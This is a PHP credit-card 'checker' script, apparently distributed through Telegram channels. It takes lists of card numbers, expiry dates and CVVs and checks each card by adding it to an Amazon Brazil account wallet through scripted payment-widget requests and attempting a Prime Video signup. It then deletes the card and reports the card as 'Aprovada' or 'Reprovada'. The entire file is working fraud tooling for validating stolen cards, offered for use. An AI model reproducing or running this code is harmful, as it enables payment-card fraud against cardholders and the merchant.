<?php
error_reporting(0);
ignore_user_abort();
session_start();
DeletarCookies();

#############################################

# DESENVOLVIDO POR PLADIXOFICIAL ( NÃO CAIA EM GOLPES / O ÚNICO ) #

# TELEGRAM: @clydeedu71 #

# CANAL NO TELEGRAM: @materialdosvideos

#############################################

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("amazon.txt")) {
        unlink("amazon.txt");
    }
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span> ➔ <span class="badge badge-warning">Suporte: @clydeedu71</span><br>');
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
$time = time();


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}


switch ($ano) { 
         case '22':$mes = '2022';break; 
         case '23':$ano = '2023';break; 
         case '24':$ano = '2024';break; 
         case '25':$ano = '2025';break; 
         case '26':$ano = '2026';break; 
         case '27':$ano = '2027';break; 
         case '28':$ano = '2028';break; 
         case '29':$ano = '2029';break; 
         case '30':$ano = '2030';break; 
         case '31':$ano = '2031';break; 
         case '32':$ano = '2032';break; 
}



$urltoken = '';

$primevideo = '';

$amazon = ''; 



# CASO NÃO SAIBA ESSA PARTE VEJA ESTE VÍDEO: https://youtu.be/FHxQE_t3xU4

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/hz/mycd/myx');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'device-memory: 8',
'sec-ch-device-memory: 8',
'dpr: 1',
'sec-ch-dpr: 1',
'viewport-width: 1920',
'sec-ch-viewport-width: 1920',
'rtt: 100',
'downlink: 10',
'ect: 4g',
'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'Service-Worker-Navigation-Preload: true',
'referer: https://www.amazon.com.br/hz/mycd/digital-console/contentlist/booksAll/dateDsc/',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: '.$amazon.''));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$myx = curl_exec($ch); /// OK

$csrfToken = getStr($myx, 'csrfToken = "','";' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.com.br/hz/mycd/ajax/ref=kinw_myk_payment_widget_init");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'data=%7B%22param%22%3A%7B%22GetPaymentsPortalWidget%22%3A%7B%7D%7D%7D&csrfToken=g9EB6MIDtFa5uIGw5DvVg77ySW0/cF1G5HykGAbECk9wAAAAAQAAAABj5onEcmF3AAAAAFgvVn10EP4nuL9RKfa6ow==');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie: '.$amazon.'',
'referer: https://www.amazon.com.br/hz/mycd/digital-console/contentlist/booksAll/dateDsc/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Service-Worker-Navigation-Preload: true'));
$modulocartao = curl_exec($ch); /// OK

$widgetppw = getStr($modulocartao, 'input type=\"hidden\" name=\"ppw-widgetState\" value=\"','\"' , 1);
$parentWidgetInstanceId = getStr($modulocartao, '\"parentWidgetInstanceId\":\"','\"' , 1);
$iFrameName = getStr($modulocartao, '\"ApxSecureIframe-','\"' , 1);
$widgetppwMyx = getStr($modulocartao, 'name=\"ppw-widgetState\" value=\"','\"' , 1);

/* COMEÇA ADD CARTAO SEM CVV */

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apx-security.amazon.com.br/cpe/pm/register');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Cookie: '.$amazon.'',
'Host: apx-security.amazon.com.br',
'Origin: https://www.amazon.com.br',
'Referer: https://www.amazon.com.br/',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'widgetState='.$widgetppw.'&returnUrl=%2Fhz%2Fmycd%2Fajax%2Fref%3Dkinw_myk_payment_widget_init&clientId=DOCS%3AKindleStore&usePopover=false&maxAgeSeconds=900&iFrameName=ApxSecureIframe-'.$iFrameName.'&parentWidgetInstanceId='.$parentWidgetInstanceId.'&hideAddPaymentInstrumentHeader=true&creatablePaymentMethods=CC');
$registercard = curl_exec($ch); //// ok

$widgetppw = getStr($registercard, '"clientId":"DOCS:KindleStore","serializedState":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apx-security.amazon.com.br/payments-portal/data/widgets2/v1/customer/'.$urltoken.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'APX-Widget-Info: DOCS:KindleStore/desktop/4NkAV0hEnNz6',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie: '.$amazon.'',
'Host: apx-security.amazon.com.br',
'Origin: https://apx-security.amazon.com.br',
'Referer: https://apx-security.amazon.com.br/cpe/pm/register',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Widget-Ajax-Attempt-Count: 0',
'X-Requested-With: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widgetState='.$widgetppw.'&ie=UTF-8&ppw-accountHolderName=pladix+mods&addCreditCardNumber='.$cc.'&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');
$addCartao = curl_exec($ch); //// ok

$widgetppw = getStr($addCartao, 'name=\"ppw-widgetState\" value=\"','\">' , 1);
$addressSelection = getStr($addCartao, 'name=\"ppw-addressSelection\" value=\"','\"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apx-security.amazon.com.br/payments-portal/data/widgets2/v1/customer/'.$urltoken.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'APX-Widget-Info: DOCS:KindleStore/desktop/4NkAV0hEnNz6',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie: '.$amazon.'',
'Host: apx-security.amazon.com.br',
'Origin: https://apx-security.amazon.com.br',
'Referer: https://apx-security.amazon.com.br/cpe/pm/register',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Widget-Ajax-Attempt-Count: 0',
'X-Requested-With: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widgetState='.$widgetppw.'&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection='.$addressSelection.'');
$salvarEndereco = curl_exec($ch); /// ok

$paymentMethodId = getStr($salvarEndereco, '"paymentInstrumentId":"','"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/'.$urltoken.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'apx-widget-info: DOCS:KindleStore/desktop/XNrk2At9guxe',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie: '.$amazon.'',
'origin: https://www.amazon.com.br',
'referer: https://www.amazon.com.br/hz/mycd/myx',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Widget-Ajax-Attempt-Count: 0',
'X-Requested-With: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$widgetppwMyx.'&ppw-widgetEvent=AddPaymentMethodRefreshEvent&ppw-paymentMethodId='.$paymentMethodId.'&ppw-widgetAction=add-credit-card-workflow-complete');
$vinculaPagamento = curl_exec($ch); /// ok

/* === PRIMEVIDEO === */

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.primevideo.com/region/na/gp/video/signup?deviceTypeId=A13Q6A55DBZB7M&_encoding=UTF8&dvah=signup&ref_=atv_auth_red_aft&continueWorkflow=1&workflowType=Acquisition");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_POST, FALSE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cookie: '.$primevideo.'',
'device-memory: 4',
'downlink: 1.3',
'dpr: 1',
'ect: 3g',
'referer: https://www.amazon.com.br/',
'rtt: 300',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'viewport-width: 852'));
$primeget = curl_exec($ch); /// ok

$widgetppw = getStr($primeget, 'name="ppw-widgetState" value="','"' , 1);
$instrumentid = getStr($primeget, 'name="ppw-instrumentRowSelection" value="instrumentId=','&amp;' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/$urltoken/continueWidget");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$widgetppw.'&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D'.$paymentMethodId.'%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'apx-widget-info: Subs:AmazonVideo/desktop/QkdLMOYr6vIn',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$primevideo.'',
'device-memory: 4',
'downlink: 4.05',
'dpr: 1',
'ect: 4g',
'origin: https://www.primevideo.com',
'referer: https://www.primevideo.com/region/na/gp/video/signup?deviceTypeId=A13Q6A55DBZB7M&_encoding=UTF8&dvah=signup&ref_=atv_auth_red_aft&continueWorkflow=1&workflowType=Acquisition',
'rtt: 250',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'viewport-width: 852',
'widget-ajax-attempt-count: 0',
'x-requested-with: XMLHttpRequest'));
$pagamento = curl_exec($ch); /// ok


/* funcao removendo cartao */


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'device-memory: 8',
'sec-ch-device-memory: 8',
'dpr: 1',
'sec-ch-dpr: 1',
'viewport-width: 1920',
'sec-ch-viewport-width: 1920',
'rtt: 100',
'downlink: 10',
'ect: 4g',
'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Service-Worker-Navigation-Preload: true',
'Referer: https://www.amazon.com.br/gp/css/homepage.html?ref_=nav_AccountFlyout_ya',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: '.$amazon.''
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$removercartaoget = curl_exec($ch);

$widgetppw = getStr($removercartaoget, '"clientId":"YA:Wallet","serializedState":"','"' , 1);
$ppwiid = getStr($removercartaoget, '"data":{"selectedInstrumentId":"','"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$urltoken/continueWidget");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$widgetppw.'&ppw-widgetEvent=StartEditEvent&ppw-iid='.$ppwiid.'&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'apx-widget-info: YA:MPO/desktop/PvQKSpEAiHVZ',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$amazon.'',
'device-memory: 8',
'downlink: 10',
'dpr: 1',
'ect: 4g',
'origin: https://www.amazon.com.br',
'referer: https://www.amazon.com.br/cpe/yourpayments/wallet?fallbacktoMPOWidget=true',
'rtt: 0',
'sec-ch-device-memory: 8',
'sec-ch-dpr: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'viewport-width: 811',
'widget-ajax-attempt-count: 0',
'x-requested-with: XMLHttpRequest'));
$editarcartao = curl_exec($ch);

$widgetppw = getStr($editarcartao, 'name=\"ppw-widgetState\" value=\"','\"' , 1);
$instrumentid = getStr($editarcartao, '"data\":{\"instrumentId\":\"','\"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$urltoken/continueWidget");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22'.$instrumentid.'%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Remover+da+carteira&ppw-jsEnabled=true&ppw-widgetState='.$widgetppw.'&ie=UTF-8&ppw-accountHolderName=lucas+diniz+mta&ppw-expirationDate_month=12&ppw-expirationDate_year=2024');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'apx-widget-info: YA:MPO/desktop/PvQKSpEAiHVZ',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$amazon.'',
'device-memory: 8',
'downlink: 10',
'dpr: 1',
'ect: 4g',
'origin: https://www.amazon.com.br',
'referer: https://www.amazon.com.br/cpe/yourpayments/wallet?fallbacktoMPOWidget=true',
'rtt: 0',
'sec-ch-device-memory: 8',
'sec-ch-dpr: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'viewport-width: 811',
'widget-ajax-attempt-count: 0',
'x-requested-with: XMLHttpRequest'));
$editandocartao = curl_exec($ch);

$widgetppw = getStr($editandocartao, 'type=\"hidden\" name=\"ppw-widgetState\" value=\"','\"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$urltoken/continueWidget");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$widgetppw.'&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'apx-widget-info: YA:MPO/desktop/PvQKSpEAiHVZ',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$amazon.'',
'device-memory: 8',
'downlink: 10',
'dpr: 1',
'ect: 4g',
'origin: https://www.amazon.com.br',
'referer: https://www.amazon.com.br/cpe/yourpayments/wallet?fallbacktoMPOWidget=true',
'rtt: 0',
'sec-ch-device-memory: 8',
'sec-ch-dpr: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'viewport-width: 811',
'widget-ajax-attempt-count: 0',
'x-requested-with: XMLHttpRequest'));
$cartaodeletado = curl_exec($ch);
curl_close($ch);

#############################################

# DESENVOLVIDO POR PLADIXOFICIAL ( NÃO CAIA EM GOLPES / O ÚNICO ) #

# TELEGRAM: @clydeedu71 #

# CANAL NO TELEGRAM: @materialdosvideos

#############################################

if(strpos($pagamento, 'payStationVerificationId":"","preferenceId":"')) {

die('<span class="badge badge-pill badge-success">Aprovada</span> <span class="badge badge-dark"> '.$lista.' </span> | <span class="badge badge-success"> Cartão válido com sucesso. </span> | <a href="https://t.me/pladixoficial" class="badge badge-primary">Copyright: @clydeedu71 </a> <br>');

}elseif(strpos($pagamento, 'Para iniciar sua assinatura, insira novamente seus dados de pagamento ou selecione outra forma de pagamento para continuar.')) {

die('<span class="badge badge-pill badge-danger">Reprovada</span> <span class="badge badge-dark"> '.$lista.' </span> | <span class="badge badge-danger"> Cartão inexistente. </span> | <a href="https://t.me/pladixoficial" class="badge badge-primary">Copyright: @clydeedu71 </a> <br>');

}elseif(strpos($pagamento, 'incorreto')) {

die('<span class="badge badge-pill badge-danger">Reprovada</span> <span class="badge badge-dark"> '.$lista.' </span> | <span class="badge badge-danger"> Cartão inválido. </span> | <a href="https://t.me/pladixoficial" class="badge badge-primary">Copyright: @clydeedu71 </a> <br>');

}

else{

die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger"> Requisição falhou, tente novamente. </span> ➔ <span class="badge badge-warning">Suporte: @clydeedu71</span><br>');

}

#############################################

# DESENVOLVIDO POR PLADIXOFICIAL ( NÃO CAIA EM GOLPES / O ÚNICO ) #

# TELEGRAM: @clydeedu71 #

# CANAL NO TELEGRAM: @materialdosvideos

#############################################

?>